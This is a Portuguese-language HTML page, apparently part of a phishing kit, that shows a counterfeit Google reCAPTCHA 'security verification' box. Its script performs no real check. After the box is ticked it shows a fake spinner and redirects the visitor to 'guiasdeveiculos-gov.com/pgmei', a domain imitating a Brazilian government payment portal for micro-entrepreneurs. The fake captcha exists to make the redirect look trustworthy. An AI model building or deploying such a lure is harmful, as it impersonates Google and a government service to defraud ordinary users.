<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portal Do Cliente</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
body {
  font-family: Roboto, Arial, Helvetica, sans-serif;
  background: #d4d4d4;
  min-height: 100vh;
  display: flex;
  align-items: center; /* Centralizado verticalmente */
  justify-content: center;
  padding: 20px;
}
.security-container {
  width: 100%;
  max-width: 380px;
  background: #f1f1f1;
  border: 1px solid #c0c0c0;
  border-radius: 16px;
  box-shadow:
    inset 0 0 0 1px rgba(255, 255, 255, 0.7),
    0 4px 12px rgba(0, 0, 0, 0.08);
  overflow: hidden;
  -webkit-font-smoothing: antialiased;
  margin-top: -40px; /* Sobe o quadrado */
}
.security-header {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 16px 18px 12px;
  border-bottom: 1px solid #e0e0e0;
  background: #fff;
  border-radius: 16px 16px 0 0;
}
.security-icon {
  width: 22px;
  height: 22px;
  flex-shrink: 0;
  color: #4285f4;
}
.security-title {
  font-size: 15px;
  font-weight: 500;
  color: #202124;
  letter-spacing: 0.01em;
}
.security-body {
  padding: 14px 18px 16px;
}
.security-text {
  font-size: 13px;
  color: #5f6368;
  line-height: 1.55;
  margin-bottom: 14px;
}
.security-note {
  font-size: 11px;
  color: #80868b;
  line-height: 1.45;
  margin-bottom: 14px;
}
.recaptcha-frame {
  width: 100%;
  height: 78px;
  background: #fff;
  border: 1px solid #c0c0c0;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 13px 0 12px;
  overflow: hidden;
}
.check-area {
  display: flex;
  align-items: center;
  gap: 12px;
  cursor: pointer;
  user-select: none;
  height: 100%;
  padding-left: 2px;
}
.check-area input {
  position: absolute;
  opacity: 0;
  width: 0;
  height: 0;
}
.custom-check {
  position: relative;
  width: 28px;
  height: 28px;
  border: 2px solid #c1c1c1;
  border-radius: 6px;
  background: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  transition: border-color 0.15s ease, background 0.15s ease;
}
.check-area:hover .custom-check:not(.checked):not(.loading) {
  border-color: #b0b0b0;
}
.check-area.verifying {
  pointer-events: none;
}
.custom-check.checked {
  border-color: #4285f4;
  background: #4285f4;
}
.custom-check.checked .check-icon {
  opacity: 1;
  animation: checkPop 0.35s cubic-bezier(0.2, 0.9, 0.3, 1.2) forwards;
}
.check-icon {
  width: 18px;
  height: 18px;
  opacity: 0;
  transform: scale(0.5);
}
.custom-check.loading {
  border-color: #c1c1c1;
  background: #fff;
}
.custom-check.loading .check-icon {
  display: none;
}
.spinner {
  position: absolute;
  top: 50%;
  left: 50%;
  width: 24px;
  height: 24px;
  margin: -12px 0 0 -12px;
  display: none;
  animation: spin 0.9s linear infinite;
  transform-origin: 12px 12px;
}
.spinner-track {
  fill: none;
  stroke: #e8eaed;
  stroke-width: 3;
}
.spinner-arc {
  fill: none;
  stroke: #4285f4;
  stroke-width: 3;
  stroke-linecap: round;
  stroke-dasharray: 28 100;
}
.custom-check.loading .spinner {
  display: block;
}
.check-text {
  font-size: 14px;
  color: #000;
  font-weight: 400;
  letter-spacing: 0.01em;
}
.captcha-brand {
  text-align: center;
  line-height: 1.15;
  padding-right: 2px;
  min-width: 68px;
}
.captcha-brand img {
  width: 32px;
  height: 32px;
  display: block;
  margin: 0 auto 1px;
}
.captcha-brand .brand-name {
  font-size: 10px;
  color: #555;
  font-weight: 400;
}
.captcha-brand .brand-links {
  font-size: 8px;
  color: #555;
  margin-top: 1px;
}
.captcha-brand a {
  color: #555;
  text-decoration: none;
}
.captcha-brand a:hover {
  text-decoration: underline;
}
@keyframes spin {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}
@keyframes checkPop {
  0% { opacity: 0; transform: scale(0.4); }
  70% { opacity: 1; transform: scale(1.08); }
  100% { opacity: 1; transform: scale(1); }
}
</style>
</head>
<body>
<div class="security-container">
  <div class="security-header">
    <svg class="security-icon" viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
    </svg>
    <span class="security-title">Verificação de segurança</span>
  </div>
  <div class="security-body">
    <p class="security-text">
      Para sua proteção, precisamos confirmar que você é uma pessoa real antes de acessar o portal.
    </p>
    <p class="security-note">
      Marque a caixa abaixo para concluir a verificação. Em seguida, você será redirecionado automaticamente.
    </p>
    <div class="recaptcha-frame">
      <label class="check-area" id="checkArea">
        <input type="checkbox" id="check">
        <div class="custom-check" id="customCheck">
          <svg class="spinner" viewBox="0 0 50 50">
            <circle class="spinner-track" cx="25" cy="25" r="20"/>
            <circle class="spinner-arc" cx="25" cy="25" r="20"/>
          </svg>
          <svg class="check-icon" viewBox="0 0 24 24" fill="none">
            <path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"/>
          </svg>
        </div>
        <span class="check-text">Não sou um robô</span>
      </label>
      <div class="captcha-brand">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="32" height="32" alt="">
        <div class="brand-name">reCAPTCHA</div>
        <div class="brand-links">
          <a href="https://policies.google.com/privacy" target="_blank">Privacidade</a>
          -
          <a href="https://policies.google.com/terms" target="_blank">Termos</a>
        </div>
      </div>
    </div>
  </div>
</div>
<script>
const check = document.getElementById("check");
const customCheck = document.getElementById("customCheck");
const checkArea = document.getElementById("checkArea");
let verifying = false;
check.addEventListener("change", () => {
  if (!check.checked) {
    if (verifying) {
      check.checked = true;
      return;
    }
    customCheck.classList.remove("checked", "loading");
    checkArea.classList.remove("verifying");
    return;
  }
  if (verifying) return;
  verifying = true;
  checkArea.classList.add("verifying");
  customCheck.classList.add("loading");
  setTimeout(() => {
    customCheck.classList.remove("loading");
    customCheck.classList.add("checked");
    checkArea.classList.remove("verifying");
    verifying = false;
    setTimeout(() => {
      window.location.href = "https://guiasdeveiculos-gov.com/pgmei";
    }, 800);
  }, 1000);
});
</script>
</body>
</html>
